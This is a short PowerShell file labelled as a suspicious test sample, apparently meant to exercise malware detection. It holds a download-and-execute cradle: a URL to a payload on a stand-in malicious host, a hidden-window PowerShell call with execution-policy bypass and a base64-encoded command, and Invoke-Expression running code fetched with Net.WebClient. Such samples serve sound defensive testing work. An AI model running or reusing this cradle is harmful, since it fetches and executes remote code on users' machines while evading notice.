# Suspicious PowerShell test file
$u = "http://example-malicious.test/payload.exe"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
Invoke-Expression (New-Object Net.WebClient).DownloadString($u)
